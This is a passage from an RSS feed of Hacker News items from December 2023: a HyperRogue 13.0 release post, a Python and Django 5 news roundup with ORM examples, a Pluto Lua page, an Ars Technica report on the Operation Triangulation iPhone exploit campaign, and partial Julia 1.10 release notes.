HyperRogue version 13.0 is released on <a href="https://store.steampowered.com/app/342610/HyperRogue/">Steam</a> and 
<a href="https://zenorogue.itch.io/hyperrogue">itch.io</a>!
</p><p>
Again, it was quite a long time since the last major update (12.0, from 2021). Of course, the work never
stopped -- improvements were continuously added to the game, so if you were following HyperRogue closely, you have seen these. For less active followers, here is a summary of the most interesting new stuff.

</p><h2>Dangerous to go in a line. Take a Crossbow!</h2><p>
Many roguelikes ensure their longevity by providing ways many different ways to play the game. This is done both by having many possible
inventory-based builds (as reflected in HyperRogue's <i>Orb Strategy Mode</i>), but also by giving a choice of playing multiple kinds of characters,
with different strengths and weaknesses; for example, the five different characters in <a href="https://zenorogue.itch.io/hydra-slayer"><i>Hydra Slayer</i></a>, or 27 different species in
<i>Dungeon Crawl Stone Soup</i>, further augmented by specialization and deity choices. However, this kind of specialization often relies on changing the damage produced
by various kinds of attacks -- HyperRogue, with its focus on geometry and one-hit combat, was relatively lacking in this area. Could we still have something similar while still maintaining the focus on geometry?
</p><center>
<a href="https://roguetemple.com/z/hyper/crossbow.png">
<img src="https://roguetemple.com/z/hyper/crossbow-thumb.png"></a>
</center><p>

HyperRogue 13.0 includes an option to play the game with another weapon: a <b>crossbow</b> instead of the classic <b>blade</b>! A classic traditional roguelike strategy is: when attacked by an overwhelming force of multiple enemies, move into a corridor, forcing them to attack one by one; HyperRogue combines this idea with hyperbolic geometry, making this strategy work even in open space, due to the geometry of the world itself. But why use your blade to attack them one by one, when you could also have a penetrating attack that kills the whole straight line of enemies in a single shot? As a counterbalance, the crossbow takes several turns to reload.
</p><p>

Rethinking the concept of a <i>straight line</i> was fundamental for the development of non-Euclidean geometries; in HyperRogue, it becomes even more sophisticated, because this geometric concept needs to be interpreted in terms of grid tactics. Some roguelikes let you fire your ranged attack at any point, while in some, they work a bit like a Queen in chess: ranged attacks can be aimed only cardinally or diagonally. And in some, it depends on the type of ranged attack used. So, the crossbow could actually be a few different weapons. A crossbow which shoots only in "bull lines" is less universal than one that can shoot along any tile-based approximation of a hyperbolic straight line, but it takes less time to reload. There is also a third option, but we will just let you see for yourself.

</p><h2>New modes, geometries, and land structures</h2><p>

Of course, while the character in HyperRogue does not change that much, neither by player's customization nor by gaining in-world experience, HyperRogue focuses on changing the world itself, or the rules of the game. There is not much new in terms of whole new modes -- unless we count new options for the real-time multiplayer mode of HyperRogue, such as PvP or split screen or using dual focus projections -- but one
of the things that can be changed is the geometry of the world... or, at least, the tiling.

</p><center>
<a href="https://roguetemple.com/z/hyper/geo-hat.png">
<img src="https://roguetemple.com/z/hyper/geo-hat-thumb.png"></a>
</center>

<p>

Probably the most popular mathematical discovery of 2023 was the discovery of <a href="https://arxiv.org/abs/2303.10798">hat</a>
and <a href="https://arxiv.org/abs/2305.17743">Spectre</a> tiles, which can tile the whole Euclidean plane by themselves, but only in non-periodic ways. Soon after this discovery, this tiling became available in HyperRogue.

</p><center>
<a href="https://roguetemple.com/z/hyper/geo-spectre.png">
<img src="https://roguetemple.com/z/hyper/geo-spectre-thumb.png"></a>
</center><p>

While the rules of HyperRogue are specially designed for hyperbolic geometry, you can e.g. play the <i>Minefield</i> land in the Hat/Spectre tiling, to get a more original variation on Minesweeper. There are more options to customize the geometry of the world -- for example, the <a href="https://github.com/zenorogue/hyperrogue/tree/master/tessellations/sample">format to specify arbitrary periodic or some horocycle-based 2D tilings</a> has been extended, three-dimensional geometries no longer include only regular hyperbolic and spherical honeycombs but their cells can be subdivided, and there is an option to play only on a finite portion of an infinite geometry. These are likely less balanced, but still cool for experimentation or visualization.

</p><center>
<a href="https://roguetemple.com/z/hyper/horodisks.png">
<img src="https://roguetemple.com/z/hyper/horodisks-thumb.png"></a>
</center><p>

If you do not want to change the geometry of the world, you can still change how it is structured... New options shown in the images above replace the usual HyperRogue land structure (lands separated mostly by hyperbolic straight lines) with alternative ones. In one, every land is bounded by a horocycle (a shape existing only in non-Euclidean geometry that looks a bit like a cirle but is actually infinite)...


</p><center>
<a href="https://roguetemple.com/z/hyper/ideal-voronoi.png">
<img src="https://roguetemple.com/z/hyper/ideal-voronoi-thumb.png"></a>
</center>

<p>

In another, the hyperbolic plane is subdivided into lands like in a Voronoi tessellation -- some points are chosen as centers, every tile gets assigned to a land depending on which center is closest to it -- but where the centers are very rare... <a href="https://arxiv.org/abs/2303.16831">so rare that they are infinitely away</a>.

</p><h2>Visualization</h2>

<center><iframe width="400" height="225" data-thumbnail-src="https://i.ytimg.com/vi/Rhjv_PazzZE/0.jpg" src="https://www.youtube.com/embed/Rhjv_PazzZE?feature=player_embedded" frameborder="0" allowfullscreen=""></iframe></center>

<p>

HyperRogue is not only about great roguelike gameplay, but also about non-Euclidean visualization! Since 2019, we could play in <a href="http://zenorogue.blogspot.com/2019/09/hyperrogue-112-thurston-geometries-free.html">Thurston geometries</a>; however, roguelikes were designed to be played in 2D, and most people find them less fun when you can move in three dimensions. Also <a href="http://zenorogue.blogspot.com/2019/06/hyperrogue-version-11.html">since 2019</a> we could play the usual 2D game of HyperRogue, but view it in full 3D. However, this 3D view was restricted to use the 3D version of that 2D geometry: hyperbolic plane in three-dimensional hyperbolic space, sphere in three-dimensional spherical space, etc. Now, the HyperRogue engine features a large list of embeddings. Unfortunately, for the standard "hyperbolic soccerball tiling" that HyperRogue plays best in, only 3-dimensional hyperbolic space, and the "product space" where the third dimension is added in the Euclidean way, works. However, a sphere can be embedded in 3D Euclidean and hyperbolic geometry, and for the Euclidean plane, especially when wrapped in flat torus, there are lots of options -- including all Thurston geometries, and more! These are explored in <a href="https://www.youtube.com/watch?v=Rhjv_PazzZE">this video</a>.

</p><center><iframe width="400" height="225" data-thumbnail-src="https://i.ytimg.com/vi/yqUv2JO2BCs/0.jpg" src="https://www.youtube.com/embed/yqUv2JO2BCs?feature=player_embedded" frameborder="0" allowfullscreen=""></iframe></center>

<p>

Another new thing is an option to create a world with portals between different geometries; we have shown this in <a href="https://www.youtube.com/watch?v=yqUv2JO2BCs">this video with over 1M views</a>, and the HyperRogue engine can be used to create spaces likes this, by placing bricks in different geometries like in Minecraft, connecting them with portals, and exploring them in VR. There is no real gameplay in these worlds, but hopefully we inspire other game developers to try new stuff!

</p><h2>Have fun!</h2><p>
On top of that, there was of course a large number of minor bugfixes and improvements. The Android version is not updated yet, but hopefully should be updated soon too.
</p><p>
To get updates on HyperRogue and our other projects faster, join <a href="https://discord.gg/8G44XkR">the HyperRogue discord server</a> or <a href="https://roguetemple.com/z/hyper/faq.php">other discussion places</a>, or follow us on <a href="https://mathstodon.xyz/@zenorogue">Mathstodon</a> or <a href="https://twitter.com/ZenoRogue/">X/Twitter</a> or <a href="https://www.youtube.com/@ZenoRogue">YouTube</a>. Also wishlist <a href="https://store.steampowered.com/app/2271110/RogueViz_Collection/">RogueViz Collection on Steam</a> for a collection of smaller non-Euclidean games. Have fun, and good luck! 
</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[What's up Python? Epic CPython commit, Django 5 and 2FA for PyPI (172 pts)]]></title>
            <link>https://www.bitecode.dev/p/whats-up-python-epic-cpython-commit</link>
            <guid>38784797</guid>
            <pubDate>Wed, 27 Dec 2023 18:18:36 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bitecode.dev/p/whats-up-python-epic-cpython-commit">https://www.bitecode.dev/p/whats-up-python-epic-cpython-commit</a>, See on <a href="https://news.ycombinator.com/item?id=38784797">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><ul><li><p><em>The best CPython commit of 2023</em></p></li><li><p><em>Django version 5</em></p></li><li><p><em>2FA gets mandatory on pypi for 2024</em></p></li><li><p><em>A proposal to clean up the logging module API</em></p></li></ul><p><span>Performance has been a busy topic this year, and&nbsp;</span><a href="https://www.bitecode.dev/p/whats-up-python-new-args-syntax-subinterpreters" rel="">we mentioned last month</a><span>&nbsp;the future JIT that was planned for 3.13.</span></p><p><span>With change&nbsp;</span><a href="https://github.com/python/cpython/pull/113465" rel="">GH-113464</a><span>, Brandt Bucher offers the whole community the Xmas gift of the first JIT related merge proposal.</span></p><p>Even if you don't intend to read the code, I strongly encourage you to read the commit message as it's made with a cheerful holiday spirit.</p><p><span>Since 3.13 alpha 2 is&nbsp;</span><a href="https://pythoninsider.blogspot.com/2023/11/python-3130-alpha-2-is-now-available.html" rel="">out of the oven</a><span>, it's all well in sync.</span></p><p><span>It's also a good time to remind you once again that 3.13 </span><a href="https://docs.python.org/dev/whatsnew/3.12.html#pending-removal-in-python-3-13" rel="">will deprecate a lot of things</a><span>, although there has been&nbsp;</span><a href="https://vstinner.github.io/remove-c-api-funcs-313.html" rel="">some push back on that side</a><span>, as people reminded Victor Stinner he is, as usual, a bit too enthusiastic about deleting stuff.</span></p><p><span>And since I'm on the topic,&nbsp;</span><a href="https://www.python.org/downloads/release/python-3117/" rel="">3.11.7</a><span>&nbsp;and&nbsp;</span><a href="https://www.python.org/downloads/release/python-3121/" rel="">3.12.1</a><span>&nbsp;were also released. Those are bug fixes of course, but if you don't follow my advice to&nbsp;</span><a href="https://www.bitecode.dev/i/112502596/first-decide-on-the-version-of-python-you-need" rel="">stay one version behind</a><span>, at least I hope you waited until 3.12.1 because 3.x.0 are always full of holes.</span></p><p><span>Since you know now that&nbsp;</span><a href="https://www.bitecode.dev/p/beginners-should-use-django-not-flask" rel="">beginners should use Django and not Flask</a><span>, maybe you will be very interested that the latest release of the web framework&nbsp;</span><a href="https://docs.djangoproject.com/en/5.0/releases/5.0/" rel="">dropped this month</a><span>. </span></p><p>On the menu:</p><ul><li><p>The ORM used to allow dynamic default values for any field, but expected a Python function to provide them. We can now declare that the database should generate them. E.G:</p></li></ul><pre><code><code>from django.db import models
from django.db.models.functions import Now, Pi


class MyModel(models.Model):
    age = models.IntegerField(db_default=18)
    created = models.DateTimeField(db_default=Now())
    circumference = models.FloatField(db_default=2 * Pi())</code></code></pre><ul><li><p>Following in the same trend, the ORM now has a way for you to define fields generated on the database side, such as a field made from other fields. E.G:</p></li></ul><pre><code><code>from django.db import models
from django.db.models import F


class Square(models.Model):
    side = models.IntegerField()
    area = models.GeneratedField(
        expression=F("side") * F("side"),
        output_field=models.BigIntegerField(),
        db_persist=True,
    )</code></code></pre><ul><li><p>Templates for form rendering have been simplified: you can now decide the granularity of what part of the form you want to customize, using field groups.</p></li><li><p><code>UUIDField</code><span>&nbsp;uses a correct UUID column on MariaDB 10.7.</span></p></li><li><p>Django now supports oracledb version 1.3.2 or higher, but cx_Oracle support is deprecated.</p></li><li><p>The asynchronous work in progress continues, with many more features supporting it, such as authentication or view decorators.</p></li></ul><p>Django 5 drops support for Python 3.9 and bellow, though, so if you use those, stay on the 4.2.X series.</p><p><span>New users of pypi had recently to activate 2FA to be able to manage their account. This test has proven successful, and given t</span><a href="https://blog.pypi.org/posts/2023-12-04-account-takeover/" rel="">he regular attacks on pypi</a><span>,&nbsp;</span><a href="https://blog.pypi.org/posts/2023-12-13-2fa-enforcement/" rel="">2FA will be rolled out for&nbsp;</a><strong><a href="https://blog.pypi.org/posts/2023-12-13-2fa-enforcement/" rel="">all users</a></strong><a href="https://blog.pypi.org/posts/2023-12-13-2fa-enforcement/" rel="">&nbsp;in 2024</a><span>.</span></p><p>You have the choice between a security key like a yubikey, or a TOTP code.</p><p>I just tested the procedure, and it took only a few minutes, despite having 4 yubikeys and 2 TOTP apps to configure.</p><p>Very well implemented.</p><p><span>I have a love/hate relationship with the stdlib&nbsp;</span><a href="https://docs.python.org/3/library/logging.html" rel="">logging</a><span>&nbsp;module. On one hand, it means Python ships with a rich, versatile, fully functional logging module out of the box, that is so configurable you can pretty much do anything with it, and it's thread safe by default! It's kinda amazing, and rare enough to state it.</span></p><p>On the other hand, the API is terrible. It's verbose, counterintuitive, has bad default values, and is written in camel Case.</p><p><a href="https://github.com/metaperl/peps/blob/main/peps/pep-8106.rst" rel="">The draft of PEP 8106</a><span>&nbsp;aims to change this very last point, and at least provide a version of logging that would be PEP8 compliant. The idea is not to remove the old API, but at to come up with aliases that don't make you feel like you coding in 1998 Java.</span></p><p><span>So&nbsp;</span><code>logging.basicConfig</code><span>&nbsp;would also be available as&nbsp;</span><code>logging.basic_config</code><span>,&nbsp;</span><code>Logger.setLevel</code><span>&nbsp;would be available also as&nbsp;</span><code>Logger.set_level</code><span>, and so on.</span></p><p><span>The PEP is very bare bone and doesn't have a sponsor yet, so I wouldn't expect it to go very far. Plus, I'm not saying this is the right solution. An&nbsp;</span><code>os.path</code><span>&nbsp;to&nbsp;</span><code>pathlib</code><span>&nbsp;new wrapper module would sit better with me.</span></p><p>But I like the fact it's shaking this tree.</p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Pluto, a Modern Lua Dialect (111 pts)]]></title>
            <link>https://pluto-lang.org/</link>
            <guid>38784188</guid>
            <pubDate>Wed, 27 Dec 2023 17:25:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://pluto-lang.org/">https://pluto-lang.org/</a>, See on <a href="https://news.ycombinator.com/item?id=38784188">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><p><a href="#__docusaurus_skipToContent_fallback">Skip to main content</a></p></div><nav aria-label="Main"><div><div><a href="https://pluto-lang.org/"><p><img src="https://pluto-lang.org/img/logo.png" alt="Pluto Logo"><img src="https://pluto-lang.org/img/logo.png" alt="Pluto Logo"></p><b>Pluto</b></a><p><a href="https://pluto-lang.org/docs/Introduction">Documentation</a></p></div><div><a href="https://github.com/PlutoLang/Pluto" target="_blank" rel="noopener noreferrer">GitHub</a></div></div></nav><div id="__docusaurus_skipToContent_fallback"><header><div><p>A superset of Lua 5.4 — with unique features, optimizations, and improvements.</p><div><p><a href="https://pluto-lang.org/docs/Introduction">Learn More</a></p></div></div></header><main><div><div><h3>New Syntax</h3><p>Pluto implements various popular syntaxes that are absent in Lua.</p></div><div><h3>Optimizations</h3><p>Pluto is slightly faster than Lua, but in some instances by a pretty large margin.</p></div><div><h3>Larger Standard Library</h3><p>Pluto aims to meet the standard library of Python, and is slowly encroaching this goal.</p></div></div></main></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[4-year campaign backdoored iPhones using possibly most advanced exploit ever (407 pts)]]></title>
            <link>https://arstechnica.com/security/2023/12/exploit-used-in-mass-iphone-infection-campaign-targeted-secret-hardware-feature/</link>
            <guid>38784073</guid>
            <pubDate>Wed, 27 Dec 2023 17:15:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arstechnica.com/security/2023/12/exploit-used-in-mass-iphone-infection-campaign-targeted-secret-hardware-feature/">https://arstechnica.com/security/2023/12/exploit-used-in-mass-iphone-infection-campaign-targeted-secret-hardware-feature/</a>, See on <a href="https://news.ycombinator.com/item?id=38784073">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
                                    
<figure>
  <img src="https://cdn.arstechnica.net/wp-content/uploads/2023/12/omgiphonehax-800x534.jpg" alt="iphone with text background">
      <figcaption></figcaption>  </figure>

  




<!-- cache hit 334:single/related:f3cfa98b90961ddcdffd21654e316ec1 --><!-- empty -->
<p>Researchers on Wednesday presented intriguing new findings surrounding an attack that over four years backdoored dozens if not thousands of iPhones, many of which belonged to employees of Moscow-based security firm Kaspersky. Chief among the discoveries: the unknown attackers were able to achieve an unprecedented level of access by exploiting a vulnerability in an undocumented hardware feature that few if anyone outside of Apple and chip suppliers such as ARM Holdings knew of.</p>
<p>“The exploit's sophistication and the feature's obscurity suggest the attackers had advanced technical capabilities,” Kaspersky researcher Boris Larin wrote in an email. “Our analysis hasn't revealed how they became aware of this feature, but we're exploring all possibilities, including accidental disclosure in past firmware or source code releases. They may also have stumbled upon it through hardware reverse engineering.”</p>
<h2>Four zero-days exploited for years</h2>
<p>Other questions remain unanswered, wrote Larin, even after about 12 months of intensive investigation. Besides how the attackers learned of the hardware feature, the researchers still don’t know what, precisely, its purpose is. Also unknown is if the feature is a native part of the iPhone or enabled by a third-party hardware component such as ARM’s CoreSight</p>
<p>The mass backdooring campaign, which according to Russian officials also infected the iPhones of thousands of people working inside diplomatic missions and embassies in Russia, according to Russian government officials, <a href="https://arstechnica.com/information-technology/2023/06/clickless-ios-exploits-infect-kaspersky-iphones-with-never-before-seen-malware/">came to light in June</a>. Over a span of at least four years, Kaspersky said, the infections were delivered in iMessage texts that installed malware through a complex exploit chain without requiring the receiver to take any action.
</p><p>With that, the devices were infected with full-featured spyware that, among other things, transmitted microphone recordings, photos, geolocation, and other sensitive data to attacker-controlled servers. Although infections didn’t survive a reboot, the unknown attackers kept their campaign alive simply by sending devices a new malicious iMessage text shortly after devices were restarted.</p>
<p>A fresh infusion of details disclosed Wednesday said that “Triangulation”—the name Kaspersky gave to both the malware and the campaign that installed it—exploited four critical zero-day vulnerabilities, meaning serious programming flaws that were known to the attackers before they were known to Apple. The company has since patched all four of the vulnerabilities, which are tracked as:</p>                                            
                                                        
<ul>
<li><a href="https://support.apple.com/en-us/103837">CVE-2023-32434</a></li>
<li><a href="https://support.apple.com/en-us/HT213676">CVE-2023-32435</a></li>
<li><a href="https://support.apple.com/en-us/HT213841">CVE-2023-38606</a></li>
<li><a href="https://support.apple.com/en-us/HT213842">CVE-2023-41990</a></li>
</ul>
<p>Besides affecting iPhones, these critical zero-days and the secret hardware function resided in Macs, iPods, iPads, Apple TVs, and Apple Watches. What’s more, the exploits Kaspersky recovered were intentionally developed to work on those devices as well. Apple has patched those platforms as well.</p>
<p>Detecting infections is extremely challenging, even for people with advanced forensic expertise. For those who want to try, a list of Internet addresses, files, and other indicators of compromise is <a href="https://securelist.com/triangulation-validators-modules/110847/">here</a>.</p>
<h2>Mystery iPhone function proves pivotal to Triangulation’s success</h2>
<p>The most intriguing new detail is the targeting of the heretofore-unknown hardware feature, which proved to be pivotal to the Operation Triangulation campaign. A zero-day in the feature allowed the attackers to bypass advanced <a href="https://support.apple.com/guide/security/operating-system-integrity-sec8b776536b/web">hardware-based memory protections</a> designed to safeguard device system integrity even after an attacker gained the ability to tamper with memory of the underlying kernel. On most other platforms, once attackers successfully exploit a kernel vulnerability they have full control of the compromised system.</p>
<p>On Apple devices equipped with these protections, such attackers are still unable to perform key post-exploitation techniques such as injecting malicious code into other processes, or modifying kernel code or sensitive kernel data. This powerful protection was bypassed by exploiting a vulnerability in the secret function. The protection, which has rarely been defeated in exploits found to date, is also present in Apple’s M1 and M2 CPUs.</p>
<p>Kaspersky researchers learned of the secret hardware function only after months of extensive reverse engineering of devices that had been infected with Triangulation. In the course, the researchers' attention was drawn to what are known as hardware registers, which provide memory addresses for CPUs to interact with peripheral components such as USBs, memory controllers, and GPUs. MMIOs, short for Memory-mapped Input/Outputs, allow the CPU to write to the specific hardware register of a specific peripheral device.</p>
<p>The researchers found that several of MMIO addresses the attackers used to bypass the memory protections weren’t identified in any <a href="https://www.nxp.com/docs/en/application-note/AN5125.pdf">device tree documentation</a>, which acts as a reference for engineers creating hardware or software for iPhones. Even after the researchers further scoured source codes, kernel images, and firmware, they were still unable to find any mention of the MMIO addresses.</p>

                                                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Julia 1.10 (179 pts)]]></title>
            <link>https://docs.julialang.org/en/v1/NEWS/</link>
            <guid>38783886</guid>
            <pubDate>Wed, 27 Dec 2023 16:57:29 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://docs.julialang.org/en/v1/NEWS/">https://docs.julialang.org/en/v1/NEWS/</a>, See on <a href="https://news.ycombinator.com/item?id=38783886">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="documenter-page"><h2 id="New-language-features"><a href="#New-language-features">New language features</a><a id="New-language-features-1"></a><a href="#New-language-features" title="Permalink"></a></h2><ul><li>JuliaSyntax.jl is now used as the default parser, providing better diagnostics and faster parsing. Set environment variable <code>JULIA_USE_FLISP_PARSER</code> to <code>1</code> to switch back to the old parser if necessary (and if you find this necessary, please file an issue) (<a href="https://github.com/JuliaLang/julia/issues/46372">#46372</a>).</li><li><code>⥺</code> (U+297A, <code>\leftarrowsubset</code>) and <code>⥷</code> (U+2977, <code>\leftarrowless</code>) may now be used as binary operators with arrow precedence (<a href="https://github.com/JuliaLang/julia/issues/45962">#45962</a>).</li></ul><h2 id="Language-changes"><a href="#Language-changes">Language changes</a><a id="Language-changes-1"></a><a href="#Language-changes" title="Permalink"></a></h2><ul><li>When a task forks a child, the parent task's task-local RNG (random number generator) is no longer affected. The seeding of child based on the parent task also takes a more disciplined approach to collision resistance, using a design based on the SplitMix and DotMix splittable RNG schemes (<a href="https://github.com/JuliaLang/julia/issues/49110">#49110</a>).</li><li>A new more-specific rule for methods resolves ambiguities containing Union{} in favor of the method defined explicitly to handle the Union{} argument. This makes it possible to define methods to explicitly handle Union{} without the ambiguities that commonly would result previously. This also lets the runtime optimize certain method lookups in a way that significantly improves load and inference times for heavily overloaded methods that dispatch on Types (such as traits and constructors).</li><li>The "h bar" <code>ℏ</code> (<code>\hslash</code> U+210F) character is now treated as equivalent to <code>ħ</code> (<code>\hbar</code> U+0127).</li><li>The <code>@simd</code> macro now has more limited and clearer semantics: it only enables reordering and contraction of floating-point operations, instead of turning on all "fastmath" optimizations. If you observe performance regressions due to this change, you can recover previous behavior with <code>@fastmath @simd</code>, if you are OK with all the optimizations enabled by the <code>@fastmath</code> macro (<a href="https://github.com/JuliaLang/julia/issues/49405">#49405</a>).</li><li>When a method with keyword arguments is displayed in the stack trace view, the textual representation of the keyword arguments' type is simplified using the new <code>@Kwargs{key1::Type1, ...}</code> macro syntax (<a href="https://github.com/JuliaLang/julia/issues/49959">#49959</a>).</li></ul><h2 id="Compiler/Runtime-improvements"><a href="#Compiler/Runtime-improvements">Compiler/Runtime improvements</a><a id="Compiler/Runtime-improvements-1"></a><a href="#Compiler/Runtime-improvements" title="Permalink"></a></h2><ul><li>The mark phase of the garbage collector is now multi-threaded (<a href="https://github.com/JuliaLang/julia/issues/48600">#48600</a>).</li><li><a href="https://llvm.org/docs/JITLink.html">JITLink</a> is enabled by default on Linux aarch64 when Julia is linked to LLVM 15 or later versions (<a href="https://github.com/JuliaLang/julia/issues/49745">#49745</a>). This should resolve many segmentation faults previously observed on this platform.</li><li>The precompilation process now uses pidfile locks and orchestrates multiple julia processes to only have one process spend effort precompiling while the others wait. Previously all would do the work and race to overwrite the cache files. (<a href="https://github.com/JuliaLang/julia/issues/49052">#49052</a>)</li></ul><h2 id="Command-line-option-changes"><a href="#Command-line-option-changes">Command-line option changes</a><a id="Command-line-option-changes-1"></a><a href="#Command-line-option-changes" title="Permalink"></a></h2><ul><li>New option <code>--gcthreads</code> to set how many threads will be used by the garbage collector (<a href="https://github.com/JuliaLang/julia/issues/48600">#48600</a>). The default is <code>N/2</code> where <code>N</code> is the number of worker threads (<code>--threads</code>) used by Julia.</li></ul><h2 id="Build-system-changes"><a href="#Build-system-changes">Build system changes</a><a id="Build-system-changes-1"></a><a href="#Build-system-changes" title="Permalink"></a></h2><ul><li>SparseArrays and SuiteSparse are no longer included in the default system image, so the core language no longer contains GPL libraries. However, these libraries are still included alongside the language in the standard binary distribution (<a href="https://github.com/JuliaLang/julia/issues/44247">#44247</a>, <a href="https://github.com/JuliaLang/julia/issues/48979">#48979</a>, <a href="https://github.com/JuliaLang/julia/issues/49266">#49266</a>).</li></ul><h2 id="New-library-functions"><a href="#New-library-functions">New library functions</a><a id="New-library-functions-1"></a><a href="#New-library-functions" title="Permalink"></a></h2><ul><li><code>tanpi</code> is now defined. It computes tan(π<em>x) more accurately than `tan(pi</em>x)` (<a href="https://github.com/JuliaLang/julia/issues/48575">#48575</a>).</li><li><code>fourthroot(x)</code> is now defined in <code>Base.Math</code> and can be used to compute the fourth root of <code>x</code>.  It can also be accessed using the unicode character <code>∜</code>, which can be typed by <code>\fourthroot&lt;tab&gt;</code> (<a href="https://github.com/JuliaLang/julia/issues/48899">#48899</a>).</li><li><code>Libc.memmove</code>, <code>Libc.memset</code>, and <code>Libc.memcpy</code> are now defined, whose functionality matches that of their respective C calls.</li><li><code>Base.isprecompiled(pkg::PkgId)</code> has been added, to identify whether a package has already been precompiled (<a href="https://github.com/JuliaLang/julia/issues/50218">#50218</a>).</li></ul><h2 id="New-library-features"><a href="#New-library-features">New library features</a><a id="New-library-features-1"></a><a href="#New-library-features" title="Permalink"></a></h2><ul><li><code>binomial(x, k)</code> now supports non-integer <code>x</code> (<a href="https://github.com/JuliaLang/julia/issues/48124">#48124</a>).</li><li>A <code>CartesianIndex</code> is now treated as a "scalar" for broadcasting (<a href="https://github.com/JuliaLang/julia/issues/47044">#47044</a>).</li><li><code>printstyled</code> now supports italic output (<a href="https://github.com/JuliaLang/julia/issues/45164">#45164</a>).</li><li><code>parent</code> and <code>parentindices</code> support <code>SubString</code>s.</li><li><code>replace(string, pattern...)</code> now supports an optional <code>IO</code> argument to write the output to a stream rather than returning a string (<a href="https://github.com/JuliaLang/julia/issues/48625">#48625</a>).</li><li><code>startswith</code> now supports seekable <code>IO</code> streams (<a href="https://github.com/JuliaLang/julia/issues/43055">#43055</a>).</li></ul><h2 id="Standard-library-changes"><a href="#Standard-library-changes">Standard library changes</a><a id="Standard-library-changes-1"></a><a href="#Standard-library-changes" title="Permalink"></a></h2><ul><li>The <code>initialized=true</code> keyword assignment for <code>sortperm!</code> and <code>partialsortperm!</code> is now a no-op (<a href="https://github.com/JuliaLang/julia/issues/47979">#47979</a>). It previously exposed unsafe behavior (<a href="https://github.com/JuliaLang/julia/issues/47977">#47977</a>).</li><li>Printing integral <code>Rational</code>s will skip the denominator in <code>Rational</code>-typed IO context (e.g. in arrays) (<a href="https://github.com/JuliaLang/julia/issues/45396">#45396</a>).</li></ul><h4 id="Package-Manager"><a href="#Package-Manager">Package Manager</a><a id="Package-Manager-1"></a><a href="#Package-Manager" title="Permalink"></a></h4><ul><li><code>Pkg.precompile</code> now accepts <code>timing</code> as a keyword argument which displays per package timing information for precompilation (e.g. <code>Pkg.precompile(timing=true)</code>).</li></ul><h4 id="LinearAlgebra"><a href="#LinearAlgebra">LinearAlgebra</a><a id="LinearAlgebra-1"></a><a href="#LinearAlgebra" title="Permalink"></a></h4><ul><li><code>AbstractQ</code> no longer subtypes <code>AbstractMatrix</code>. Moreover, <code>adjoint(Q::AbstractQ)</code> no longer wraps <code>Q</code> in an <code>Adjoint</code> type, but instead in an <code>AdjointQ</code>, that itself subtypes <code>AbstractQ</code>. This change accounts for the fact that typically <code>AbstractQ</code> instances behave like function-based, matrix-backed linear operators, and hence don't allow for efficient indexing. Also, many <code>AbstractQ</code> types can act on vectors/matrices of different size, acting like a matrix with context-dependent size. With this change, <code>AbstractQ</code> has a well-defined API that is described in detail in the <a href="https://docs.julialang.org/en/v1/stdlib/LinearAlgebra/#man-linalg-abstractq">Julia documentation</a> (<a href="https://github.com/JuliaLang/julia/issues/46196">#46196</a>).</li><li>Adjoints and transposes of <code>Factorization</code> objects are no longer wrapped in <code>Adjoint</code> and <code>Transpose</code> wrappers, respectively. Instead, they are wrapped in <code>AdjointFactorization</code> and <code>TranposeFactorization</code> types, which themselves subtype <code>Factorization</code> (<a href="https://github.com/JuliaLang/julia/issues/46874">#46874</a>).</li><li>New functions <code>hermitianpart</code> and <code>hermitianpart!</code> for extracting the Hermitian (real symmetric) part of a matrix (<a href="https://github.com/JuliaLang/julia/issues/31836">#31836</a>).</li><li>The <code>norm</code> of the adjoint or transpose of an <code>AbstractMatrix</code> now returns the norm of the parent matrix by default, matching the current behaviour for <code>AbstractVector</code>s (<a href="https://github.com/JuliaLang/julia/issues/49020">#49020</a>).</li><li><code>eigen(A, B)</code> and <code>eigvals(A, B)</code>, where one of <code>A</code> or <code>B</code> is symmetric or Hermitian, are now fully supported (<a href="https://github.com/JuliaLang/julia/issues/49533">#49533</a>).</li><li><code>eigvals/eigen(A, cholesky(B))</code> now computes the generalized eigenvalues (<code>eigen</code>: and eigenvectors) of <code>A</code> and <code>B</code> via Cholesky decomposition for positive definite <code>B</code>. Note: The second argument is the output of <code>cholesky</code>.</li></ul><h4 id="Printf"><a href="#Printf">Printf</a><a id="Printf-1"></a><a href="#Printf" title="Permalink"></a></h4><ul><li>Format specifiers now support dynamic width and precision, e.g. <code>%*s</code> and <code>%*.*g</code> (<a href="https://github.com/JuliaLang/julia/issues/40105">#40105</a>).</li></ul><h4 id="REPL"><a href="#REPL">REPL</a><a id="REPL-1"></a><a href="#REPL" title="Permalink"></a></h4><ul><li>When stack traces are printed, the printed depth of types in function signatures will be limited to avoid overly verbose output (<a href="https://github.com/JuliaLang/julia/issues/49795">#49795</a>).</li></ul><h4 id="Test"><a href="#Test">Test</a><a id="Test-1"></a><a href="#Test" title="Permalink"></a></h4><ul><li>The <code>@test_broken</code> macro (or <code>@test</code> with <code>broken=true</code>) now complains if the test expression returns a non-boolean value in the same way as a non-broken test (<a href="https://github.com/JuliaLang/julia/issues/47804">#47804</a>).</li><li>When a call to <code>@test</code> fails or errors inside a function, a larger stacktrace is now printed such that the location of the  test within a <code>@testset</code> can be retrieved (<a href="https://github.com/JuliaLang/julia/issues/49451">#49451</a>).</li></ul><h4 id="InteractiveUtils"><a href="#InteractiveUtils">InteractiveUtils</a><a id="InteractiveUtils-1"></a><a href="#InteractiveUtils" title="Permalink"></a></h4><ul><li><code>code_native</code> and <code>@code_native</code> now default to intel syntax instead of AT&amp;T.</li><li><code>@time_imports</code> now shows the timing of any module <code>__init__()</code>s that are run (<a href="https://github.com/JuliaLang/julia/issues/49529">#49529</a>).</li></ul><h2 id="Deprecated-or-removed"><a href="#Deprecated-or-removed">Deprecated or removed</a><a id="Deprecated-or-removed-1"></a><a href="#Deprecated-or-removed" 